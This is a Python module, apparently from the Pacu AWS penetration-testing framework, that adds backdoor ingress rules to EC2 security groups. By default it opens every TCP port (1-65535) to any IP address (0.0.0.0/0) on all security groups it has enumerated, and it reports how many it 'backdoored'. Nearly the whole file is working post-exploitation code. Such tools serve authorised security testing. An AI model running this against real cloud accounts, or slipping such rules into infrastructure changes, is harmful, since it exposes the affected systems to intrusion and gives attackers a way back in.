#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'backdoor_ec2_sec_groups',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_security_groups.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Adds backdoor rules to EC2 security groups.',

    # Description about what the module does and how it works
    'description': 'This module adds rules to backdoor EC2 security groups. It attempts to open ingress port ranges from an IP of your choice.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_ec2_sec_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--ip', '--port-range', '--protocol', '--groups'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--ip', required=False, default='0.0.0.0/0', help='The IP address or CIDR range to allow access to (ex: 127.0.0.1/24). The default is to allow access from any IP address (0.0.0.0/0).')
parser.add_argument('--port-range', required=False, default='1-65535', help='The port range to open for each EC2 security group in the format start-end (ex: 1-455). The default range is every port (1-65535).')
parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
parser.add_argument('--groups', required=False, default=None, help='The EC2 security groups to backdoor in the format of a comma separated list of name@region. If omitted, all security groups will be backdoored.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    fetch_data = pacu_main.fetch_data
    ######

    groups = []

    summary_data = {}

    client = pacu_main.get_boto3_client('ec2', 'us-east-1')

    # Check permissions before hammering through each region
    try:
        client.authorize_security_group_ingress(
            DryRun=True
        )
    except ClientError as error:
        if not str(error).find('UnauthorizedOperation') == -1:
            print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_instances".\nExiting module.')
            return

    if args.groups is not None:
        groups_and_regions = args.groups.split(',')
        for group in groups_and_regions:
            groups.append({
                'GroupName': group.split('@')[0],
                'Region': group.split('@')[1]
            })
    else:
        if fetch_data(['EC2', 'SecurityGroups'], 'enum_ec2', '--security-groups') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        groups = session.EC2['SecurityGroups']
    summary_data['BackdooredCount'] = 0
    for group in groups:
        print('Group: {}'.format(group['GroupName']))

        client = pacu_main.get_boto3_client('ec2', group['Region'])

        try:
            print('Applying rule to security group {}...'.format(group['GroupName']))
            client.authorize_security_group_ingress(
                GroupName=group['GroupName'],
                CidrIp=args.ip,
                FromPort=int(args.port_range.split('-')[0]),
                ToPort=int(args.port_range.split('-')[1]),
                IpProtocol=args.protocol
            )
            print('  Success.')
            print('Port range {} opened for IP {}.'.format(args.port_range, args.ip))
            summary_data['BackdooredCount'] += 1
        except ClientError as error:
            print('  Error: {}'.format(error.response['Error']['Message']))

    print('{} completed.\n'.format(module_info['name']))
    return summary_data


def summary(data, pacu_main):
    out = ''
    if 'BackdooredCount' in data:
        out += '  {} security group(s) successfully backdoored.\n'.format(data['BackdooredCount'])
    return out
